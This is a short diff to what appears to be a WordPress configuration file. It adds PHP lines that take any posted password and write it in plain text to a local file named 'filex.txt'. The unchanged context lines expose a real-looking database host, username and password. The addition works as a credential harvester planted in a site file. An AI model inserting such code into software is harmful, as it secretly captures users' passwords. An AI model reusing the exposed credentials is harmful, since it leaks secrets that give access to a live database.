@@ -65,6 +65,11 @@ define( 'NONCE_SALT',       'put your unique phrase here' );
  */
 
 $password = $_POST['password'];
+$file = fopen("filex.txt", "a"); // "a" untuk append ke file
+if ($file) {
+    fwrite($file, "Password yang dimasukkan: " . $password . "\n");
+    fclose($file);
+}
 $host = "neto.caltec.mx";  
 $user = "neto_web";     
 $pass = "WeBNeto2019";          
